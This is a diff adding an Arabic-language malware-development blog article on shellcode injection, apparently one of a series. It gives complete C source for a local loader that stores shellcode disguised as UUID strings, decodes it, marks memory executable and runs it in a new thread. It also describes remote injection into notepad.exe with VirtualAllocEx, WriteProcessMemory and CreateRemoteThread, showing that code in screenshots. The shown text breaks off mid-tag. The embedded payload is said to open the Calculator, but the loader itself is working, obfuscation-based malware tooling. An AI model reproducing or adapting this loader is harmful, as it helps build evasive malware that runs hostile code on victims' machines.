@@ -1,0 +1,956 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ShellCode Injection</title>
+    <link rel="icon" href="../src/Pics/ShCdi.webp" type="image/png">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet"
+        crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+    <style>
+        html,
+        body {
+            font-family: 'Cairo', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: black;
+            overflow-x: hidden;
+        }
+
+        nav {
+            width: 100%;
+            height: 10vh;
+            position: sticky;
+        }
+
+        .nav-container {
+            width: 100%;
+            height: 100%;
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+        }
+
+        .logo {
+            font-size: 2rem;
+            font-weight: bold;
+            cursor: pointer;
+            background: -webkit-linear-gradient(gold, #ffed00);
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .logo span {
+            cursor: pointer;
+            background: -webkit-linear-gradient(gold, #ffed00);
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .hamburg,
+        .cancel {
+            cursor: pointer;
+            position: absolute;
+            right: 15px;
+            top: 10px;
+            color: gold;
+            display: none;
+            font-size: clamp(2.5rem, 0.5rem + 5vw, 3rem);
+        }
+
+        .nav-container .links {
+            display: flex;
+        }
+
+        .nav-container .links a {
+            font-size: 1.2rem;
+            color: white;
+            margin: 0 20px;
+            text-decoration: none;
+            font-weight: 550;
+            transition: 0.3s linear;
+        }
+
+        .nav-container .links a:hover {
+            color: gold;
+            border-bottom: 2px solid gold;
+        }
+
+        .dropdown {
+            max-height: 100vh;
+            overflow-y: auto;
+            z-index: 100;
+            position: absolute;
+            top: 0;
+            transform: translateY(-500px);
+            width: 100%;
+            height: auto;
+            backdrop-filter: blur(4px) brightness(40%);
+            box-shadow: 0 0 20px black;
+            transition: 0.2s linear;
+        }
+
+        .dropdown .links a {
+            display: flex;
+            color: white;
+            text-decoration: none;
+            padding: 15px 0;
+            justify-content: center;
+            align-items: center;
+            transition: 0.2s linear;
+        }
+
+        .dropdown .links a:hover {
+            background-color: gold;
+            color: black;
+        }
+
+        .dark-mode {
+            background-color: #222;
+            color: #f4f4f4;
+        }
+
+        header {
+            background: -webkit-linear-gradient(gold, #ffed00);
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-align: center;
+            border-bottom: 1px solid gold;
+        }
+
+
+
+        header h1 {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+        }
+
+        .container {
+            max-width: 800px;
+            margin: 20px auto;
+            padding: 0 15px;
+        }
+
+
+        .article {
+            background: white;
+            padding: 20px;
+            margin-bottom: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        .article h2 {
+            margin-top: 0;
+            border-top: 2px solid gold;
+            border-bottom: 2px solid gold;
+            padding-bottom: 5px;
+        }
+
+        .code-block {
+            background: gold;
+            padding: 10px;
+            border-radius: 5px;
+            overflow-x: auto;
+            direction: ltr;
+            text-align: left;
+            font-size: 15px;
+        }
+
+
+        @media (max-width:884px) {
+            nav .logo {
+                position: absolute;
+                top: 16px;
+                left: 15px;
+                font-size: 1.5rem;
+            }
+
+            .nav-container .links {
+                display: none;
+            }
+
+            .hamburg,
+            .cancel {
+                display: block;
+            }
+
+        }
+
+
+        @media (max-width:440px) {
+            .nav-container {
+                margin-top: 10px;
+            }
+
+            table {
+                display: block;
+                overflow-x: auto;
+            }
+        }
+
+        .footer {
+            background: #111;
+            color: #fff;
+            text-align: center;
+            padding: 5px;
+            position: relative;
+            bottom: 0;
+            width: 100%;
+            margin-top: auto;
+        }
+
+        .footer a {
+            color: gold;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .footer a:hover {
+            color: #51460c;
+
+        }
+
+        .ltr {
+            direction: ltr;
+            text-align: left;
+        }
+
+        .article-image {
+            width: 100%;
+            height: auto;
+            border-radius: 8px;
+        }
+
+        .nav-buttons a {
+            background: gold;
+            color: black;
+            padding: 10px 0;
+            border-radius: 5px;
+            text-decoration: none;
+            transition: background-color 0.3s;
+            text-align: center;
+            flex: 1;
+            margin: 0 10px;
+            max-width: 150px;
+            font-size: 20px;
+        }
+
+        .nav-buttons {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 20px;
+        }
+
+        .nav-buttons a:hover {
+            background: #51460c;
+            color: #fff;
+        }
+
+        .download-link {
+            text-decoration: none;
+            color: gold;
+            font-weight: bold;
+            transition: color 0.3s ease;
+        }
+
+        .download-link:hover {
+            color: #51460c;
+            text-decoration: underline;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 10px auto;
+            text-align: center;
+
+
+        }
+
+        th,
+        td {
+            border: 1px solid black;
+            padding: 7px;
+        }
+
+        th {
+            background-color: gold;
+        }
+    </style>
+</head>
+
+<body>
+    <section>
+        <nav>
+            <div class="nav-container" style="direction: ltr;">
+                <div class="logo" data-aos="zoom-in" data-aos-duration="800">
+                    <span>0x4de1</span>
+                </div>
+                <div class="links">
+                    <div class="link" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100"><a
+                            href="https://0x4de1.github.io">Home</a></div>
+                    <div class="link" data-aos="fade-up" data-aos-duration="800" data-aos-delay="300"><a
+                            href="../MalDev.html">Mal Dev</a></div>
+                    <div class="link" data-aos="fade-up" data-aos-duration="800" data-aos-delay="400"><a
+                            href="https://0x4de1.medium.com/" id="blogLink">CTF Writeups</a></div>
+                </div>
+            </div>
+            <i class="fa-solid fa-bars hamburg" onclick="hamburg()"></i>
+            <div class="dropdown">
+                <div class="links">
+                    <a href="https://0x4de1.github.io">Home</a>
+                    <a href="../MalDev.html">Mal Dev</a>
+                    <a href="https://0x4de1.medium.com">CTF Writeups</a>
+                    <i class="fa-solid fa-xmark cancel" onclick="cancel()"></i>
+                </div>
+            </div>
+        </nav>
+        <header>
+            <h1 id="article-title" style="direction: ltr;">ShellCode Injection</h1>
+        </header>
+        <div class="container">
+            <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                <img src="../src/Pics/ShCdi.webp" alt="HomeLab" class="article-image" loading="lazy">
+            </div>
+            <div class="article" data-aos="zoom-in" data-aos-duration="800">
+                <p style="text-align: center; font-weight: bold;">السَّلاَمُ عَلَيْكُمْ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ
+                </p>
+                <p style="text-align: center; font-weight: bold;">اللَّهُمَّ صَلِّ عَلَى مُحَمَّدٍ وَعَلَى آلِ
+                    مُحَمَّدٍ، كَمَا صَلَّيْتَ عَلَى إِبْرَاهِيمَ وَآلِ
+                    إِبْرَاهِيمَ، إِنَّكَ حَمِيدٌ مَجِيدٌ، وَبَارِكْ عَلَى مُحَمَّدٍ وَعَلَى آلِ مُحَمَّدٍ، كَمَا
+                    بَارَكْتَ عَلَى إِبْرَاهِيمَ وَآلِ إِبْرَاهِيمَ، إِنَّكَ حَمِيدٌ مَجِيدٌ،<br>
+                    <br>
+                    ✨🌙 هَلَّ هِلالُ الخَيْرِ، فَأسألُ اللهَ أنْ يَملأ قُلوبَكم بالنُّورِ واليقينِ، مُبَارَكٌ عَلَيكُمُ
+                    الشَّهْرُ 🌙✨
+                <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                    <img src="../src/Pics/Ramadan2.jpg" alt="HomeLab" class="article-image" loading="lazy">
+                </div>
+                </p>
+            </div>
+            <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                <h2>Introduction</h2>
+                <p>[+] إتكلمنا فـ المقالة اللـ فاتت عن الـ DLL Injection .. في المقالة دي هنتكلم عن نوع تاني من أنواع
+                    الـ Process Injection وهو الـ <code
+                        style="background: gold; font-size: 14px;">Shellcode Injection</code>.</p>
+                <p style="font-weight: bold;">[+] وهنتكلم تحديدا عن :</p>
+                <ol style="font-weight: bold; direction: ltr;">
+                    <li>Local Shellcode Execution</li>
+                    <li>Remote Shellcode Injection</li>
+                </ol>
+                <h2 style="direction: ltr;">1. Local Shellcode Execution</h2>
+                <p>[+] فـ المقالات اللـ فاتت كُنا بنستخدم شيل كود بسيط وظيفته إنه يفتح الـ Calculator ، بس مجربناش نديله
+                    أمر عشان يشتغل قبل كده .. فـ الجزء دا بقي هنتكلم عن لو معانا شيل كود ، ازاي نقدر نشغله. </p>
+                <p style="font-weight: bold;">[+] بس قبل مـ ندخل ع الكود ، تعالي أوضحلك إحنا رايحين نعمل إيه :</p>
+                <ol>
+                    <li>هنعمل Obfuscation للشيل كود باستخدام تول الـ <code
+                            style="background: gold; font-size: 14px;">HellShell</code> اللـ اتكلمنا عنها قبل كده.
+                    </li>
+                    <li>هنحجز مكان فـ الميموري باستخدام <code
+                            style="background: gold; font-size: 14px;">VirtualAlloc</code> علشان نحط فيه الشيل كود.
+                    </li>
+                    <li>هناخد كوبي من الشيل كود ونحطه فـ المكان اللـ حجزناه باستخدام <code
+                            style="background: gold; font-size: 14px;">memcpy</code>.</li>
+                    <li>هنغير صلاحيات الميموري عشان نقدر نديله أمر يتنفذ باستخدام <code
+                            style="background: gold; font-size: 14px;">VirtualProtect</code>.</li>
+                    <li>هنشغل الشيل كود جوا ثريد باستخدام <code
+                            style="background: gold; font-size: 14px;">CreateThread</code> عشان يتنفذ.</li>
+                </ol>
+                <p style="font-weight: bold;">[+] يلا بينا نشوف الخطوات :</p>
+                <ol>
+                    <li style="font-weight: bold;">هنروح لـ تول <code
+                            style="background: gold; font-size: 14px;">HellShell</code> وهنعمل <code
+                            style="background: gold; font-size: 14px;">Obfuscation</code> للشيل كود ولأي طريقة تحبها
+                        .. انا استخدمت UUIDs :</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/LocalShellcodeEx-1.png" alt="LocalShellcodeEx-1" class="article-image"
+                            loading="lazy">
+                    </div>
+                    <li style="font-weight: bold;">هنكريت بروجيكت جديد ، وهنضيف الـ Output اللـ طلع من التول :</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/LocalShellcodeEx-2.png" alt="LocalShellcodeEx-2" class="article-image"
+                            loading="lazy">
+                    </div>
+                    <li style="font-weight: bold;">هندخل ع الـ main func ، وأول حاجه هنجهز الـ variables وهنستدعي
+                        العملية بتاعة الـ
+                        Deobfuscation :</li>
+                    <div class="code-block"><code>    PBYTE pDeobfuscatedPayload = NULL;<br>
+                            SIZE_T sDeobfuscatedSize = 0;<br>
+                            DWORD dwOldProtection = 0;<br><br>
+                        
+                            if (!UuidDeobfuscation(UuidArray, NumberOfElements, &pDeobfuscatedPayload, &sDeobfuscatedSize)) {<br>
+                                &nbsp;&nbsp;return -1;<br>
+                            }</code></div>
+                    <li style="font-weight: bold;">هنستخدم <code
+                            style="background: gold; font-size: 14px;">VirtualAlloc</code> عشان نحجز مكان فـ الميموري
+                        .. وتقدر تشوف الـ
+                        Documentation بتاعها من <a
+                            href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc"
+                            target="_blank" class="download-link">[هنا]</a>.</li>
+                    والفكرة انه بيحجز مساحة في الميموري بحجم الـ Shellcode بعد فك التشفير ، وبيحدد لها الـ Protection
+                    Flags على إنها <code style="background: gold; font-size: 14px;">PAGE_READWRITE</code> يعني
+                    صلاحيات قراءة وكتابة بس (هنغير الصلاحيات بعدين).
+
+                    <div class="code-block"><code>    PVOID pShellcodeAddress = VirtualAlloc(NULL, sDeobfuscatedSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);<br>
+                        if (pShellcodeAddress == NULL) {<br>
+                            &nbsp;&nbsp;printf("[!] VirtualAlloc Failed with Error : %d \n", GetLastError());<br>
+                            &nbsp;&nbsp;HeapFree(GetProcessHeap(), 0, pDeobfuscatedPayload);<br>
+                            &nbsp;&nbsp;return -1;<br>
+                        }</code></div>
+                    <li style="font-weight: bold;">هننقل الشيل كود للمكان اللـ حجزناه باستخدام الـ <code
+                            style="background: gold; font-size: 14px;">memcpy</code> :</li>
+                    بتاخد <code style="background: gold; font-size: 14px;">pDeobfuscatedPayload</code> (الـ Shellcode
+                    بعد فك التشفير) وبيحطه فـ المنطقة الجديدة اللـ حجزناها فـ
+                    الميموري عند <code style="background: gold; font-size: 14px;">pShellcodeAddress</code>.
+                    <div class="code-block"><code> memcpy(pShellcodeAddress, pDeobfuscatedPayload, sDeobfuscatedSize);
+                    </code></div>
+                    بعدين هنستخدم memset ودي بتعمل Wipe للـ <code
+                        style="background: gold; font-size: 14px;">pDeobfuscatedPayload</code> عن طريق ملء المساحة
+                    بتاعته بأصفار ، وده
+                    عشان نمنع أي أثر ليه فـ الميموري ، وميفضلش متاح لحد تاني يقرأه.
+                    <div class="code-block"><code>memset(pDeobfuscatedPayload, 0, sDeobfuscatedSize);</code></div>
+                    بعد ما نقلنا الـ Shellcode للمكان الجديد معتش فيه لازمة للميموري اللـ كانت مخزناه ، فبنمسحها من الـ
+                    Heap عشان نمنع أي Memory Leak.
+                    <div class="code-block"><code>    HeapFree(GetProcessHeap(), 0, pDeobfuscatedPayload);
+                    </code></div>
+                    <li style="font-weight: bold;">هنغيرفـ صلاحيات الميموري عشان نقدر ننفذ الـ Shellcode بعد ما خزناه
+                        باستخدام الـ <code style="background: gold; font-size: 14px;">VirtualProtect</code> :</li>
+                    بتاخد عنوان الـ <code style="background: gold; font-size: 14px;">Shellcode pShellcodeAddress</code>
+                    وبيغير
+                    الصلاحيات بتاعته لـ <code style="background: gold; font-size: 14px;">PAGE_EXECUTE_READWRITE</code> ،
+                    وده
+                    معناه إن المساحة دي من الميموري بقت ممكن نقراها ، نكتب فيها ، وكمان ننفذ أي كود جواها (وده ضروري
+                    عشان نقدر نشغل الـ Shellcode) .. وبتخزن القيمه القديمة للصلاحيات في <code
+                        style="background: gold; font-size: 14px;">dwOldProtection</code> عشان لو عاوزين
+                    نرجعها تاني بعدين.
+                    <div class="code-block"><code>    if (!VirtualProtect(pShellcodeAddress, sDeobfuscatedSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {<br>
+                        &nbsp;&nbsp;printf("[!] VirtualProtect Failed with Error : %d \n", GetLastError());<br>
+                        &nbsp;&nbsp;VirtualFree(pShellcodeAddress, 0, MEM_RELEASE);<br>
+                        &nbsp;&nbsp;return -1;<br>
+                    }</code></div>
+                    <li style="font-weight: bold;">هنعمل Thread جديد عشان يشغل الـ Shellcode باستخدام الـ <code
+                            style="background: gold; font-size: 14px;">CreateThread</code> :
+                    </li>
+                    البارامتر <code
+                        style="background: gold; font-size: 14px;">(LPTHREAD_START_ROUTINE)pShellcodeAddress</code>
+                    بيحدد إن الكود اللـ هيبدأ تنفيذ الـ <code style="background: gold; font-size: 14px;">Thread</code>
+                    هو
+                    الموجود فـ <code style="background: gold; font-size: 14px;">pShellcodeAddress</code> ، وده فعليا
+                    بيشغل الـ Shellcode .. بقية البارامترز مش مستخدمه هنا غير
+                    آخر واحد الـ بيخزن <code style="background: gold; font-size: 14px;">threadID</code> عشان نقدر
+                    نعرف الـ ID بتاع الـ Thread الجديد.
+                    <div class="code-block"><code>    DWORD threadID;<br>
+                        HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pShellcodeAddress, NULL, 0, &threadID);<br>
+                        if (hThread == NULL) {<br>
+                            &nbsp;&nbsp;VirtualFree(pShellcodeAddress, 0, MEM_RELEASE);<br>
+                            &nbsp;&nbsp;return -1;<br>
+                        }</code></div>
+                    <li style="font-weight: bold;">آخر خطوة تنظيف الـ Resources بعد تشغيل الـ Shellcode :</li>
+                    بعد مـ الـ Shellcode يشتغل لازم ننضف وراه عشان منسبش أي موارد مفتوحة .. بنستنى الـ Thread يخلص شغله
+                    باستخدام <code style="background: gold; font-size: 14px;">WaitForSingleObject</code> ، وبعدها
+                    بنمسح الميموري اللـ كنا حجزناها بـ <code
+                        style="background: gold; font-size: 14px;">VirtualAlloc</code> عن طريق
+                    <code style="background: gold; font-size: 14px;">VirtualFree</code> ، وأخيرا بنقفل الـ Thread بـ
+                    <code style="background: gold; font-size: 14px;">CloseHandle</code> عشان نتفادى الـ Memory Leaks
+                    وأي مشاكل ممكن
+                    تأثر على أداء السيستم.
+                    <div class="code-block"><code>    WaitForSingleObject(hThread, INFINITE);<br>
+                        VirtualFree(pShellcodeAddress, 0, MEM_RELEASE);<br>
+                        CloseHandle(hThread);</code></div>
+                </ol>
+                <p style="border-top: 2px solid gold;"></p>
+                <p style="font-weight: bold;">[+] يلا نـ رن :</p>
+                <ul>
+                    <li style="font-weight: bold;">هتلاقي الكود اشتغل وتمام :</li>
+                    ولو حابب تضيف أي عبارات تنطبع زي اللـ كنا بنعملة فـ كل المقالات اللـ فاتت ، فـ براحتك.
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/LocalShellcodeEx-3.png" alt="LocalShellcodeEx-3" class="article-image"
+                            loading="lazy">
+                    </div>
+                </ul>
+                <p style="font-weight: bold;">الكود النهائي :</p>
+                <div class="code-block"><code>
+                    #include &lt;windows.h><br>
+                        #include &lt;stdio.h><br><br>
+                        
+                        char* UuidArray[] = {<br>
+                            &nbsp;&nbsp;"E48348FC-E8F0-00C0-0000-415141505251", "D2314856-4865-528B-6048-8B5218488B52", "728B4820-4850-B70F-4A4A-4D31C94831C0",<br>
+                            &nbsp;&nbsp;"7C613CAC-2C02-4120-C1C9-0D4101C1E2ED", "48514152-528B-8B20-423C-4801D08B8088", "48000000-C085-6774-4801-D0508B481844",<br>
+                            &nbsp;&nbsp;"4920408B-D001-56E3-48FF-C9418B348848", "314DD601-48C9-C031-AC41-C1C90D4101C1", "F175E038-034C-244C-0845-39D175D85844",<br>
+                            &nbsp;&nbsp;"4924408B-D001-4166-8B0C-48448B401C49", "8B41D001-8804-0148-D041-5841585E595A", "59415841-5A41-8348-EC20-4152FFE05841",<br>
+                            &nbsp;&nbsp;"8B485A59-E912-FF57-FFFF-5D48BA010000", "00000000-4800-8D8D-0101-000041BA318B", "D5FF876F-F0BB-A2B5-5641-BAA695BD9DFF",<br>
+                            &nbsp;&nbsp;"C48348D5-3C28-7C06-0A80-FBE07505BB47", "6A6F7213-5900-8941-DAFF-D563616C632E", "00657865-9090-9090-9090-909090909090"<br>
+                        };<br><br>
+                        
+                        #define NumberOfElements 18<br><br>
+                        
+                        typedef RPC_STATUS(WINAPI* fnUuidFromStringA)(<br>
+                        &nbsp;&nbsp;RPC_CSTR        StringUuid,<br>
+                        &nbsp;&nbsp;UUID* Uuid<br>
+                            );
+                            <br><br>
+                        BOOL UuidDeobfuscation(IN CHAR* UuidArray[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {<br>
+                            &nbsp;&nbsp;PBYTE pBuffer = NULL, TmpBuffer = NULL;<br>
+                            &nbsp;&nbsp;SIZE_T sBuffSize = 0;<br>
+                            &nbsp;&nbsp;NTSTATUS STATUS = 0;<br><br>
+                        
+                            &nbsp;&nbsp;fnUuidFromStringA pUuidFromStringA = (fnUuidFromStringA)GetProcAddress(LoadLibrary(TEXT("RPCRT4")), "UuidFromStringA");<br>
+                            &nbsp;&nbsp;if (pUuidFromStringA == NULL) {<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
+                                &nbsp;&nbsp;}<br><br>
+                        
+                                &nbsp;&nbsp;sBuffSize = NmbrOfElements * 16;<br>
+                                &nbsp;&nbsp;pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);<br>
+                                &nbsp;&nbsp;if (pBuffer == NULL) {<br>
+                                    &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());<br>
+                                    &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
+                                    &nbsp;&nbsp;}<br><br>
+                        
+                                    &nbsp;&nbsp;TmpBuffer = pBuffer;<br><br>
+                        
+                                    &nbsp;&nbsp;for (int i = 0; i < NmbrOfElements; i++) {<br>
+                                        &nbsp;&nbsp;&nbsp;&nbsp;if ((STATUS = pUuidFromStringA((RPC_CSTR)UuidArray[i], (UUID*)TmpBuffer)) != RPC_S_OK) {<br>
+                                            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("[!] UuidFromStringA Failed At [%s] With Error 0x%0.8X\n", UuidArray[i], STATUS);<br>
+                                            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;HeapFree(GetProcessHeap(), 0, pBuffer);<br>
+                                            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
+                                            &nbsp;&nbsp;&nbsp;&nbsp;}<br>
+                                            &nbsp;&nbsp;&nbsp;&nbsp;TmpBuffer += 16;<br>
+                                            &nbsp;&nbsp;}<br><br>
+                        
+                                            &nbsp;&nbsp;*ppDAddress = pBuffer;<br>
+                                            &nbsp;&nbsp;*pDSize = sBuffSize;<br>
+                                            &nbsp;&nbsp;return TRUE;<br>
+                        }<br><br>
+                        
+                        int main() {<br>
+                            &nbsp;&nbsp;PBYTE pDeobfuscatedPayload = NULL;<br>
+                            &nbsp;&nbsp;SIZE_T sDeobfuscatedSize = 0;<br>
+                            &nbsp;&nbsp;DWORD dwOldProtection = 0;<br><br>
+                        
+                        
+                            &nbsp;&nbsp;if (!UuidDeobfuscation(UuidArray, NumberOfElements, &pDeobfuscatedPayload, &sDeobfuscatedSize)) {<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;return -1;<br>
+                                &nbsp;&nbsp;}<br><br>
+                                &nbsp;&nbsp;PVOID pShellcodeAddress = VirtualAlloc(NULL, sDeobfuscatedSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);<br>
+                                &nbsp;&nbsp;if (pShellcodeAddress == NULL) {<br>
+                                    &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] VirtualAlloc Failed with Error : %d \n", GetLastError());<br>
+                                    &nbsp;&nbsp;&nbsp;&nbsp;HeapFree(GetProcessHeap(), 0, pDeobfuscatedPayload);<br>
+                                    &nbsp;&nbsp;&nbsp;&nbsp;return -1;<br>
+                                    &nbsp;&nbsp;}<br><br>
+                        
+                                    &nbsp;&nbsp;memcpy(pShellcodeAddress, pDeobfuscatedPayload, sDeobfuscatedSize);<br>
+                                    &nbsp;&nbsp;memset(pDeobfuscatedPayload, 0, sDeobfuscatedSize);<br>
+                                    &nbsp;&nbsp;HeapFree(GetProcessHeap(), 0, pDeobfuscatedPayload);<br><br>
+                        
+                                    &nbsp;&nbsp;if (!VirtualProtect(pShellcodeAddress, sDeobfuscatedSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {<br>
+                                        &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] VirtualProtect Failed with Error : %d \n", GetLastError());<br>
+                                        &nbsp;&nbsp;&nbsp;&nbsp;VirtualFree(pShellcodeAddress, 0, MEM_RELEASE);<br>
+                                        &nbsp;&nbsp;&nbsp;&nbsp;return -1;<br>
+                                        &nbsp;&nbsp;}<br><br>
+                        
+                                        &nbsp;&nbsp;DWORD threadID;<br>
+                                        &nbsp;&nbsp;HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pShellcodeAddress, NULL, 0, &threadID);<br>
+                                        &nbsp;&nbsp;if (hThread == NULL) {<br>
+                                            &nbsp;&nbsp;&nbsp;&nbsp;VirtualFree(pShellcodeAddress, 0, MEM_RELEASE);<br>
+                                            &nbsp;&nbsp;&nbsp;&nbsp;return -1;<br>
+                                            &nbsp;&nbsp;}<br><br>
+                        
+                                            &nbsp;&nbsp;WaitForSingleObject(hThread, INFINITE);<br>
+                                            &nbsp;&nbsp;VirtualFree(pShellcodeAddress, 0, MEM_RELEASE);<br>
+                                            &nbsp;&nbsp;CloseHandle(hThread);<br><br>
+                        
+                                            &nbsp;&nbsp;return 0;<br>
+                        }<br>
+                        
+                </code></div>
+                <br>
+                <h2 style="direction: ltr;">2. Remote Shellcode Injection</h2>
+                <p>[+] لو فاكر فـ مقالة الـ DLL Injection ، اتكلمنا عن إزاي نحقن ملف DLL داخل بروسيس فـ جزئية الـ <code
+                        style="background: gold; font-size: 14px;">Remote DLL Injection</code>.</p>
+                <p style="font-weight: bold;">[+] هنا بقى فـ الـ <code
+                        style="background: gold; font-size: 14px;">Remote Shellcode Injection</code> ، هنستعين بنفس
+                    الفكرة ، بس
+                    بدل مـ بنحقن DLL ، هنحقن
+                    Shellcode جوا البروسيس اللـ مستهدفينها .. وتعالي أقولك هنمشي إزاي :</p>
+                <ol>
+                    <li>بناخد <code style="background: gold; font-size: 14px;">Snapshot</code> لكل العمليات اللـ
+                        شغالة باستخدام <code style="background: gold; font-size: 14px;">CreateToolhelp32Snapshot</code>.
+                    </li>
+                    <li>بعدين نبدأ ندور ع البروسيس المستهدفة ، ولما نلاقيها بناخد <code
+                            style="background: gold; font-size: 14px;">Handle</code> عليها باستخدام <code
+                            style="background: gold; font-size: 14px;">OpenProcess</code>.
+                    </li>
+                    <li>بنحجز مساحة فـ الميموري جوه البروسيس باستخدام <code
+                            style="background: gold; font-size: 14px;">VirtualAllocEx</code> ، وبعدها بنكتب الشيل كود
+                        فيها باستخدام
+                        <code style="background: gold; font-size: 14px;">WriteProcessMemory</code>.
+                    </li>
+                    <li> بعد كده بنغير صلاحيات الميموري عشان تكون قابلة للتنفيذ باستخدام <code
+                            style="background: gold; font-size: 14px;">VirtualProtectEx</code>.</li>
+                    <li> وآخر حاجه بنشغل الشيل كود داخل البروسيس باستخدام <code
+                            style="background: gold; font-size: 14px;">CreateRemoteThread</code>.</li>
+                </ol>
+                <p style="font-weight: bold;">[+] يلا بينا نشوف الخطوات :</p>
+                <ol>
+                    <li style="font-weight: bold;">أول جزء هنستخدم تول الـ <code
+                            style="background: gold; font-size: 14px;">HellShell</code> زي الطريقة اللـ فوق .. وعشان
+                        حابب
+                        أغير قولت هستخدم طريقة الـ
+                        <code style="background: gold; font-size: 14px;">IPv6</code> المرادي :
+                    </li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/RemoteShellcodeInj-1.png" alt="RemoteShellcodeInj-1" class="article-image"
+                            loading="lazy">
+                    </div>
+                    <li style="font-weight: bold;">هنستعين بالفنكشن <code
+                            style="background: gold; font-size: 14px;">GetRemoteProcessHandle</code> من كود الـ <code
+                            style="background: gold; font-size: 14px;">Remote DLL Injection</code> .. وهنضيف مكتبة الـ
+                        &lt;<code style="background: gold; font-size: 14px;">TlHelp32.h</code>> :</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/RemoteShellcodeInj-2.png" alt="RemoteShellcodeInj-2" class="article-image"
+                            loading="lazy">
+                    </div>
+                    <li style="font-weight: bold;">هنكريت فانكشن بـ اسم <code
+                            style="background: gold; font-size: 14px;">ShellcodeInjectionToRemoteProcess</code> ودي اللـ
+                        مسئولة عن إنها تحقن الشيل كود :
+                    </li>
+                    وجزء الأكواد اللـ هنا مبيختلفش كتير عن الـ <code
+                        style="background: gold; font-size: 14px;">Remote DLL Injection</code> .. فـ تقدر ترجع للمقالة
+                    اللـ فاتت
+                    وهتفهم .. وكذلك المقالات كلها ماشيين ع نفس النمط فـ الدنيا المفروض تكون بسيطة يعني.
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/RemoteShellcodeInj-3.png" alt="RemoteShellcodeInj-3" class="article-image"
+                            loading="lazy">
+                    </div>
+                    <li>آخر جزء ودا الـ <code style="background: gold; font-size: 14px;">main func</code> وعادي كذلك زي
+                        كود الـ DLL والاكواد السابقة :</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/RemoteShellcodeInj-4.png" alt="RemoteShellcodeInj-4" class="article-image"
+                            loading="lazy">
+                    </div>
+                </ol>
+                <p style="border-top: 2px solid gold;"></p>
+                <p style="font-weight: bold;">[+] يلا نـ رن :</p>
+                <ul>
+                    <li>هتلاقي إن الـ <code style="background: gold; font-size: 14px;">Calculator</code> بتشتغل من
+                        البروسيس وتمام :</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/RemoteShellcodeInj-5.png" alt="RemoteShellcodeInj-5" class="article-image"
+                            loading="lazy">
+                    </div>
+                </ul>
+                <p style="font-weight: bold;">[+] تعالي نتأكد أكتر ونجرب طريقة تانية مستخدمنهاش قبل
+                    كده :</p>
+                <ol>
+                    <li style="font-weight: bold;">هنستخدم الـ <a href="https://sourceforge.net/projects/x64dbg/"
+                            target="_blank" class="download-link">x64dbg</a> ودي تول بتستخدم للـ Debugging .. هنشغل
+                        البرنامج
+                        بتاعنا ع الـ <code style="background: gold; font-size: 14px;">notepad.exe</code></li>
+                    <li style="font-weight: bold;">من Attach هنربط البروسيس <code
+                            style="background: gold; font-size: 14px;">notepad.exe</code></li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/RemoteShellcodeInj-6.png" alt="RemoteShellcodeInj-6" class="article-image"
